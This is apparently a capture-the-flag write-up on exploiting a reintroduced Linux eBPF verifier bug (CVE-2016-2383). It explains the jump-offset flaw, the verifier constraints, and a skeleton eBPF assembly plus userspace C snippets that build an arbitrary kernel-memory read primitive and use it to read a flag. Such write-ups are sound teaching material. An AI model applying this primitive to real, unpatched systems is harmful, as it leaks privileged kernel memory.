Please stop reading here if you don't want to be spoiled. I still wanna know
how difficult this challenge is :)

The CVE is described in https://nvd.nist.gov/vuln/detail/CVE-2016-2383 and
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a1b14d27ed0965838350f1377ff97c93ee383492

## The vulnerability

The the verifier sometimes rewrites instructions into multiple instructions,
as seen in the example in the commit message:

```
insns[0]                        insns[0]
insns[1] <--- target_X          insns[1] <--- target_X
insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y
insns[3]                        insns[P]  `------| delta
insns[4] <--- i/insn            insns[P]   `-----|
insns[5]                        insns[3]
                                insns[4] <--- i/insn
                                insns[5]
```

Here insns[2] is rewritten into three instructions, insns[P]. eBPF jumps are
done with relative offsets, so if a backjump after the rewritten instruction
jumps either to the rewritten instruction or to any instruction before it,
the relative offset has to be updated to increase by the number of added
instructions.

Here, the jumping instruction (insns[4]) originally jumps to target_Y
(insns[2]) with a relative offset of -3 (jump offset is relative to the next
instruction), but the vulnerable verifier code does not consider the jump a
cross-boundary jump (when in fact it is cross-boundary), so the offset is not
increased. The outcome of the rewrite is that it now jumps to the last
insns[P] when it should be jumping to the first insns[P].

eBPF verifier is harsh on the verification, so we need to craft a eBPF payload
that:
* does not have a back-edge (jump to a previously seen instruction) which would
  create a loop. This is enforced by verifier for unprivileged eBPF
  ([kernel/bpf/verifier.c#L8756](https://elixir.bootlin.com/linux/v5.12.14/source/kernel/bpf/verifier.c#L8756))
* does not have any unreachable instructions. Enforced by verifier for all
  applications
  ([kernel/bpf/verifier.c#L8887](https://elixir.bootlin.com/linux/v5.12.14/source/kernel/bpf/verifier.c#L8887))
* has a backward jump to an expanded instruction (or up to a certain number of
  instructions before it, but I won't go into details because of previous
  constraints making this relaxation not very useful)

Because of constraint 1 and 2, the only way we can craft a back edge is by
jumping forward then backward without any gaps, such as:

```
insn[0] ------|
insn[1] <---| |
insn[2] --| | |
insn[3] <-+-+-|
insn[4] --+-|
insn[5] <-|
```

In this example the trace looks like:
* step insn[0]
* fwd  jump[3]
* step insn[4]
* back insn[1]
* step insn[2]
* fwd  insn[5]

## The exploit

The next puzzle to solve is, given we are constrained to unprivileged eBPF,
what are the options that can be used as an expanding instruction?

In the CVE, the beginning of commit message writes that "when ctx access
is used". "ctx" is referring to the execution context of eBPF programs, i.e.
the argument to the BPF program "function", and what R1 contains at the start
of the program's execution. The type of the context variable is dependent on
the type of the eBPF program, as defined in
[include/linux/bpf_types.h](https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/bpf_types.h)

Unprivileged eBPF can load two types of eBPF programs,
`BPF_PROG_TYPE_SOCKET_FILTER` and `BPF_PROG_TYPE_CGROUP_SKB`. This is enforced at
[kernel/bpf/syscall.c#L2112](https://elixir.bootlin.com/linux/v5.12.14/source/kernel/bpf/syscall.c#L2112).

The definitions of these program types are, as seen in the linked `bpf_types.h`:

```C
BPF_PROG_TYPE(BPF_PROG_TYPE_SOCKET_FILTER, sk_filter,
                    struct __sk_buff, struct sk_buff)
BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SKB, cg_skb,
                    struct __sk_buff, struct sk_buff)
```

Here, `struct __sk_buff` is the context used by eBPF pre-verifier code as R1,
and `struct sk_buff` is the context used by eBPF post-verifier code as R1.

Side note: The reason for different structs is that the user-facing
pre-verifier struct has guaranteed backwards and forwards compatibility;
moving struct member offsets is off limits. The post-verifier struct on the
other hand is a kernel-internal struct with zero guarantees on ABI
compatibility.

What are the options for struct fields that are rewritten? The definition of
accessible fields and how they are rewritten are defined in the the prog type's
verifier_ops. Because it is much easier to attach a socket filter than a cgroup
skb program, we look at socket filter's first. It is
[net/core/filter.c#L9834](https://elixir.bootlin.com/linux/v5.12.14/source/net/core/filter.c#L9834):

```C
const struct bpf_verifier_ops sk_filter_verifier_ops = {
        .get_func_proto         = sk_filter_func_proto,
        .is_valid_access        = sk_filter_is_valid_access,
        .convert_ctx_access     = bpf_convert_ctx_access,
        .gen_ld_abs             = bpf_gen_ld_abs,
};
```

`sk_filter_is_valid_access` defines the list of acceptable fields that can be
accessed:

<details>
<summary>sk_filter_is_valid_access</summary>
<p>

```C
static bool sk_filter_is_valid_access(int off, int size,
                                      enum bpf_access_type type,
                                      const struct bpf_prog *prog,
                                      struct bpf_insn_access_aux *info)
{
        switch (off) {
        case bpf_ctx_range(struct __sk_buff, tc_classid):
        case bpf_ctx_range(struct __sk_buff, data):
        case bpf_ctx_range(struct __sk_buff, data_meta):
        case bpf_ctx_range(struct __sk_buff, data_end):
        case bpf_ctx_range_till(struct __sk_buff, family, local_port):
        case bpf_ctx_range(struct __sk_buff, tstamp):
        case bpf_ctx_range(struct __sk_buff, wire_len):
                return false;
        }

        if (type == BPF_WRITE) {
                switch (off) {
                case bpf_ctx_range_till(struct __sk_buff, cb[0], cb[4]):
                        break;
                default:
                        return false;
                }
        }

        return bpf_skb_is_valid_access(off, size, type, prog, info);
}

static bool bpf_skb_is_valid_access(int off, int size, enum bpf_access_type type,
                                    const struct bpf_prog *prog,
                                    struct bpf_insn_access_aux *info)
{
        const int size_default = sizeof(__u32);

        if (off < 0 || off >= sizeof(struct __sk_buff))
                return false;

        /* The verifier guarantees that size > 0. */
        if (off % size != 0)
                return false;

        switch (off) {
        case bpf_ctx_range_till(struct __sk_buff, cb[0], cb[4]):
                if (off + size > offsetofend(struct __sk_buff, cb[4]))
                        return false;
                break;
        case bpf_ctx_range_till(struct __sk_buff, remote_ip6[0], remote_ip6[3]):
        case bpf_ctx_range_till(struct __sk_buff, local_ip6[0], local_ip6[3]):
        case bpf_ctx_range_till(struct __sk_buff, remote_ip4, remote_ip4):
        case bpf_ctx_range_till(struct __sk_buff, local_ip4, local_ip4):
        case bpf_ctx_range(struct __sk_buff, data):
        case bpf_ctx_range(struct __sk_buff, data_meta):
        case bpf_ctx_range(struct __sk_buff, data_end):
                if (size != size_default)
                        return false;
                break;
        case bpf_ctx_range_ptr(struct __sk_buff, flow_keys):
                return false;
        case bpf_ctx_range(struct __sk_buff, tstamp):
                if (size != sizeof(__u64))
                        return false;
                break;
        case offsetof(struct __sk_buff, sk):
                if (type == BPF_WRITE || size != sizeof(__u64))
                        return false;
                info->reg_type = PTR_TO_SOCK_COMMON_OR_NULL;
                break;
        default:
                /* Only narrow read access allowed for now. */
                if (type == BPF_WRITE) {
                        if (size != size_default)
                                return false;
                } else {
                        bpf_ctx_record_field_size(info, size_default);
                        if (!bpf_ctx_narrow_access_ok(off, size, size_default))
                                return false;
                }
        }

        return true;
}
```

</p>
</details>  

To summarize:
* These are off limits:
  * `tc_classid`
  * `data`
  * `data_meta`
  * `data_end`
  * family to local_port, consisting of:
    * `family`
    * `remote_ip4`
    * `local_ip4`
    * `remote_ip6`
    * `local_ip6`
    * `remote_port`
    * `local_port`
  * `tstamp`
  * `wire_len`
* If write, then only `cb`
* `flow_keys` is off limits
* `sk` is okay
* everything else is okay

`bpf_convert_ctx_access` defines how context accesses are rewritten (all
non-expanding accesses are trimmed):

<details>
<summary>bpf_convert_ctx_access</summary>
<p>

```C
static u32 bpf_convert_ctx_access(enum bpf_access_type type,
                                  const struct bpf_insn *si,
                                  struct bpf_insn *insn_buf,
                                  struct bpf_prog *prog, u32 *target_size)
{
        struct bpf_insn *insn = insn_buf;
        int off;

        switch (si->off) {
        case offsetof(struct __sk_buff, len):
                non-expanding;

        case offsetof(struct __sk_buff, protocol):
                non-expanding;

        case offsetof(struct __sk_buff, vlan_proto):
                non-expanding;

        case offsetof(struct __sk_buff, priority):
                non-expanding;

        case offsetof(struct __sk_buff, ingress_ifindex):
                non-expanding;

        case offsetof(struct __sk_buff, ifindex):
                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, dev),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, dev));
                *insn++ = BPF_JMP_IMM(BPF_JEQ, si->dst_reg, 0, 1);
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct net_device, ifindex, 4,
                                                     target_size));
                break;

        case offsetof(struct __sk_buff, hash):
                non-expanding;

        case offsetof(struct __sk_buff, mark):
                non-expanding;

        case offsetof(struct __sk_buff, pkt_type):
                *target_size = 1;
                *insn++ = BPF_LDX_MEM(BPF_B, si->dst_reg, si->src_reg,
                                      PKT_TYPE_OFFSET());
                *insn++ = BPF_ALU32_IMM(BPF_AND, si->dst_reg, PKT_TYPE_MAX);
#ifdef __BIG_ENDIAN_BITFIELD
                *insn++ = BPF_ALU32_IMM(BPF_RSH, si->dst_reg, 5);
#endif
                break;

        case offsetof(struct __sk_buff, queue_mapping):
                if (type == BPF_WRITE) {
                        *insn++ = BPF_JMP_IMM(BPF_JGE, si->src_reg, NO_QUEUE_MAPPING, 1);
                        *insn++ = BPF_STX_MEM(BPF_H, si->dst_reg, si->src_reg,
                                              bpf_target_off(struct sk_buff,
                                                             queue_mapping,
                                                             2, target_size));
                } else {
                        *insn++ = BPF_LDX_MEM(BPF_H, si->dst_reg, si->src_reg,
                                              bpf_target_off(struct sk_buff,
                                                             queue_mapping,
                                                             2, target_size));
                }
                break;

        case offsetof(struct __sk_buff, vlan_present):
                *target_size = 1;
                *insn++ = BPF_LDX_MEM(BPF_B, si->dst_reg, si->src_reg,
                                      PKT_VLAN_PRESENT_OFFSET());
                if (PKT_VLAN_PRESENT_BIT)
                        *insn++ = BPF_ALU32_IMM(BPF_RSH, si->dst_reg, PKT_VLAN_PRESENT_BIT);
                if (PKT_VLAN_PRESENT_BIT < 7)
                        *insn++ = BPF_ALU32_IMM(BPF_AND, si->dst_reg, 1);
                break;

        case offsetof(struct __sk_buff, vlan_tci):
                non-expanding;

        case offsetof(struct __sk_buff, cb[0]) ...
             offsetofend(struct __sk_buff, cb[4]) - 1:
                non-expanding;

        case offsetof(struct __sk_buff, tc_classid):
                non-expanding;

        case offsetof(struct __sk_buff, data):
                non-expanding;

        case offsetof(struct __sk_buff, data_meta):
                non-expanding;

        case offsetof(struct __sk_buff, data_end):
                non-expanding;

        case offsetof(struct __sk_buff, tc_index):
                non-expanding;

        case offsetof(struct __sk_buff, napi_id):
#if defined(CONFIG_NET_RX_BUSY_POLL)
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->src_reg,
                                      bpf_target_off(struct sk_buff, napi_id, 4,
                                                     target_size));
                *insn++ = BPF_JMP_IMM(BPF_JGE, si->dst_reg, MIN_NAPI_ID, 1);
                *insn++ = BPF_MOV64_IMM(si->dst_reg, 0);
#else
                *target_size = 4;
                *insn++ = BPF_MOV64_IMM(si->dst_reg, 0);
#endif
                break;
        case offsetof(struct __sk_buff, family):
                BUILD_BUG_ON(sizeof_field(struct sock_common, skc_family) != 2);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_H, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct sock_common,
                                                     skc_family,
                                                     2, target_size));
                break;
        case offsetof(struct __sk_buff, remote_ip4):
                BUILD_BUG_ON(sizeof_field(struct sock_common, skc_daddr) != 4);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct sock_common,
                                                     skc_daddr,
                                                     4, target_size));
                break;
        case offsetof(struct __sk_buff, local_ip4):
                BUILD_BUG_ON(sizeof_field(struct sock_common,
                                          skc_rcv_saddr) != 4);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct sock_common,
                                                     skc_rcv_saddr,
                                                     4, target_size));
                break;
        case offsetof(struct __sk_buff, remote_ip6[0]) ...
             offsetof(struct __sk_buff, remote_ip6[3]):
#if IS_ENABLED(CONFIG_IPV6)
                BUILD_BUG_ON(sizeof_field(struct sock_common,
                                          skc_v6_daddr.s6_addr32[0]) != 4);

                off = si->off;
                off -= offsetof(struct __sk_buff, remote_ip6[0]);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->dst_reg,
                                      offsetof(struct sock_common,
                                               skc_v6_daddr.s6_addr32[0]) +
                                      off);
#else
                *insn++ = BPF_MOV32_IMM(si->dst_reg, 0);
#endif
                break;
        case offsetof(struct __sk_buff, local_ip6[0]) ...
             offsetof(struct __sk_buff, local_ip6[3]):
#if IS_ENABLED(CONFIG_IPV6)
                BUILD_BUG_ON(sizeof_field(struct sock_common,
                                          skc_v6_rcv_saddr.s6_addr32[0]) != 4);

                off = si->off;
                off -= offsetof(struct __sk_buff, local_ip6[0]);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_W, si->dst_reg, si->dst_reg,
                                      offsetof(struct sock_common,
                                               skc_v6_rcv_saddr.s6_addr32[0]) +
                                      off);
#else
                *insn++ = BPF_MOV32_IMM(si->dst_reg, 0);
#endif
                break;

        case offsetof(struct __sk_buff, remote_port):
                BUILD_BUG_ON(sizeof_field(struct sock_common, skc_dport) != 2);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_H, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct sock_common,
                                                     skc_dport,
                                                     2, target_size));
#ifndef __BIG_ENDIAN_BITFIELD
                *insn++ = BPF_ALU32_IMM(BPF_LSH, si->dst_reg, 16);
#endif
                break;

        case offsetof(struct __sk_buff, local_port):
                BUILD_BUG_ON(sizeof_field(struct sock_common, skc_num) != 2);

                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct sk_buff, sk),
                                      si->dst_reg, si->src_reg,
                                      offsetof(struct sk_buff, sk));
                *insn++ = BPF_LDX_MEM(BPF_H, si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct sock_common,
                                                     skc_num, 2, target_size));
                break;

        case offsetof(struct __sk_buff, tstamp):
                non-expanding;

        case offsetof(struct __sk_buff, gso_segs):
                insn = bpf_convert_shinfo_access(si, insn);
                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct skb_shared_info, gso_segs),
                                      si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct skb_shared_info,
                                                     gso_segs, 2,
                                                     target_size));
                break;
        case offsetof(struct __sk_buff, gso_size):
                insn = bpf_convert_shinfo_access(si, insn);
                *insn++ = BPF_LDX_MEM(BPF_FIELD_SIZEOF(struct skb_shared_info, gso_size),
                                      si->dst_reg, si->dst_reg,
                                      bpf_target_off(struct skb_shared_info,
                                                     gso_size, 2,
                                                     target_size));
                break;
        case offsetof(struct __sk_buff, wire_len):
                non-expanding;

        case offsetof(struct __sk_buff, sk):
                non-expanding;
        }

        return insn - insn_buf;
}
```

</p>
</details>  

The intersection of permitted fields and expanded fields include:

* `ifindex`
* `pkt_type`
* `queue_mapping`
* `vlan_present`
* `napi_id`
* `gso_segs`
* `gso_size`

Look at the usability of `ifindex` first. If we could get an instruction as:
```
0: r0 = *(u32 *)(r1 + offsetof(struct __sk_buff, ifindex))
```

This would be rewritten to:
```
0: r0 = *(size_t *)(r1 + offsetof(struct sk_buff, dev))
1: if r0 == 0 goto +1
2: r0 = *(u32 *)(r0 + offsetof(struct net_device, ifindex))
```

If the jump originally targeted the rewritten instruction, after verifier
it would target the 3rd instruction. The verifier will accept it as long as
r1 points to the context without making any assumptions on r0, but r0 as
an address will be dereferenced and read out.

```
insn[0] ------|
insn[1] <---| |
insn[2] --| | |
insn[3] <-+-+-|
insn[4] --+-|
insn[5] <-|
```

If backjump target insn[1] is this instruction, and we control the value of
r0 beforehand, we have the exploit.

## The construction

We have the exploit, the dereferenced value is in an eBPF register, the task
is to pass the value on to userspace. There are a variety of methods to do
this, but most straightforward is via eBPF maps.

There are two ways to declare a map in eBPF C code. The following two
declarations declares the same map:

The newer type-aware BTF method:

```C
struct {
        __uint(type, BPF_MAP_TYPE_ARRAY);
        __type(key, int);
        __type(value, long);
        __uint(max_entries, 1);
} map_name SEC(".maps");
```

The older type-unaware `struct bpf_map_def` method:

```C
struct bpf_map_def SEC("maps") map_name = {
        .type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(int),
        .value_size = sizeof(long),
        .max_entries = 1,
};
```

Array maps have a third method. A map is automatically created for the entire
`.bss` section, so by just declaring a global variable like `long global_var;`
a map would be created.

However, since we are hand writing eBPF assembly, constructing BTF in assembly
will be raw blobs of data as they are constructed by the compiler. The most
viable method is to use the `struct bpf_map_def` method which doesn't rely on
BTF.

To interact with maps, eBPF helpers has to be used. In particular:

```C
void *bpf_map_lookup_elem(struct bpf_map *map, const void *key);
```

`bpf_map_lookup_elem` given a pointer to a map and a pointer to key
(because different maps have different types of keys), performs a lookup
and returns a pointer to the value of the entry in the map.

We check how to call the helper in assembly by compiling some C code:

```
$ clang -target bpf -Wall -pipe -O2 -D__x86_64__ -S test.bpf.c -o -
        .text
        .file   "test.bpf.c"
        .section        socket,"ax",@progbits
        .globl  prog                            # -- Begin function prog
        .p2align        3
        .type   prog,@function
prog:                                   # @prog
# %bb.0:
        r1 = 0
        *(u32 *)(r10 - 4) = r1
        r2 = r10
        r2 += -4
        r1 = arr_map ll
        call 1
        r0 = 0
        exit
.Lfunc_end0:
        .size   prog, .Lfunc_end0-prog
                                        # -- End function
        .type   arr_map,@object                 # @arr_map
        .section        maps,"aw",@progbits
        .globl  arr_map
        .p2align        2
arr_map:
        .long   2                               # 0x2
        .long   4                               # 0x4
        .long   8                               # 0x8
        .long   1                               # 0x1
        .long   0                               # 0x0
        .size   arr_map, 20

        .type   _license,@object                # @_license
        .section        license,"aw",@progbits
        .globl  _license
_license:
        .asciz  "GPL"
        .size   _license, 4

        .addrsig
        .addrsig_sym prog
        .addrsig_sym arr_map
        .addrsig_sym _license
```

The important part:

```
// set the stack variable to int 0
r1 = 0
*(u32 *)(r10 - 4) = r1
// r2 = &key
r2 = r10
r2 += -4
// r1 = &arr_map
r1 = arr_map ll
// r0 = bpf_map_lookup_elem(r1, r2)
call 1
```

Because the verifier considers the returned pointer NULL-able and NULL-able
pointers cannot be safely unconditionally dereferenced, so another check has
to be added immediately after this construct:

```
if r0 == 0 goto out
```

This r0 then can be dereferenced with read and write:

```
read:
r1 = *(u64 *)(r0 + 0)
write:
*(u64 *)(r0 + 0) = r1
```

To exit the eBPF program, store the return value into r0 and invoke the `exit`
instruction.

Now we have construct the assembly:

```
r8 = r1 // context

r0 = bpf_map_lookup_elem(&arr_map, &key)
if r0 == 0 goto out
r9 = r0 // mapval

r0 -= *(u64 *)(r9 + 0) // addr
r0 -= offsetof(struct net_device, ifindex)

[backjump shenanigans]

backjump_target:
r0 = *(u32 *)(r8 + offsetof(struct __sk_buff, ifindex))

[backjump shenanigans]

backjump_end:
*(u64 *)(r9 + 0) = r0
return 1

out:
return 0
```

The end construction of the eBPF assembly is in `healthcheck/exploit/bpf.bpf.S`.

Now we just need userspace. Loading eBPF is trivial with libbpf skeletons.
Attaching to a socket is most easily done with a UNIX socker pair which can
be constructed with a single syscall. IP sockets work too, but needs syscalls
to bind and connect.

```C
struct bpf_bpf *obj;
int prog_fd;
int sktpair[2];

obj = bpf_bpf__open_and_load();
prog_fd = bpf_program__fd(obj->progs.prog);
socketpair(AF_UNIX, SOCK_DGRAM, 0, sktpair);
setsockopt(sktpair[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
```

To communicate with the map, the libbpf functions `bpf_map_update_elem` and
`bpf_map_lookup_elem` works (they are wrappers around the
[bpf(2)](https://man7.org/linux/man-pages/man2/bpf.2.html) syscall).

```C
int key = 0;
long value = addr;

read:
bpf_map_update_elem(bpf_map__fd(obj->maps.communicate), &key, &value, 0);

write:
bpf_map_lookup_elem(bpf_map__fd(obj->maps.communicate), &key, &value);
```

To invoke the eBPF filter we can simply perform a `write` `read` pair on the
socketpair.

With that, we have a read kernel address primitive:

```C
write_map(addr);
write_read_socket();
return read_map();
```

Then we can read out a kernel string given a kernel address:

```C
while (true) {
        union {
                uint32_t u32;
                char str[4];
        } u;
        u.u32 = read_primitive(addr);

        for (int i = 0; i < 4; i++) {
                if (!u.str[i])
                        return;

                putchar(u.str[i]);
        }

        addr += 4;
}
```

And with the rest of boilerplate, we have `healthcheck/exploit/bpf.c`.

## The execution

Kernel addresses are randomized by KASLR, so they can't be hardcoded, but we
explicitly permit unprivileged access to kernel symbols via `/proc/kallsyms`.

```
$ grep uiuctf_flag /proc/kallsyms
ffffffff91158000
$ ./bpf ffffffff91158000
CTF{TestFlag}
```
